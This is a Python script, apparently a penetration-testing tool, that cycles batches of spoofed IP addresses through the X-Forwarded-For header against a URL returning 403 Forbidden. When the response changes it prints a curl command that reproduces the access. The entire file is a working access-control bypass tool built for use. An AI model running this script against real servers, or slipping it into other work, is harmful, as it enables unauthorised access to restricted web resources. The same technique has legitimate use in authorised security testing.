import iptools
import argparse
import requests

from pip._internal.network import session
from tqdm import tqdm
from itertools import zip_longest
from concurrent.futures import ThreadPoolExecutor
from requests_futures.sessions import FuturesSession


def parse_args():
    parser = argparse.ArgumentParser(
        description="X-Forwarded-For",
    )
    parser.add_argument(
        "-u", dest="url", help="Forbidden URL patch to scan", required=True
    )
    parser.add_argument(
        "-i", dest="ip_range", help="Signe IP or range to use", required=True
    )
    parser.add_argument("-w", "--workers",
                        help="Worker/thread count - default is 100", default=100)
    return parser.parse_args()


def http_status(url, ip_list):
    http_headers = {
        "Cache-Control": "no-cache, must-revalidate",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
        "X-Forwarded-For": ip_list,
    }
    session = FuturesSession(executor=ThreadPoolExecutor(max_workers=args.workers))
    future = session.get(
        url=url,
        headers=http_headers,
    )
    response = future.result()
    #print(response.headers)
    if response.status_code != 403:
        return "1", ip_list
    else:
        return "0", "0"


def generate_ips(ip_range):
    try:
        ip_addresses = iptools.IpRangeList(args.ip_range)
        return ip_addresses
    except:
        ip_start = ip_range.split("-")[0]
        ip_end = ip_range.split("-")[1]
        return iptools.IpRange(ip_start, ip_end)


if __name__ == "__main__":

    args = parse_args()

    print("URL:", args.url)
    print("IP range:", args.ip_range)
    ip_addresses = generate_ips(args.ip_range)
    print("IP address count in range:", len(ip_addresses))
    print("Iterations required:", int(-(-len(ip_addresses) // 10)), "\n")

    for ips in tqdm(zip_longest(*[iter(ip_addresses)] * 10, fillvalue="")):
        ip_list = ", ".join(filter(None, ips))
        (result, ip_list) = http_status(args.url, ip_list)
        if result == "1":
            print("\n\n[!] Access granted with", ip_list)
            print("[!] curl", args.url, '-H "X-Forwarded-For:', ip_list + '"')
            break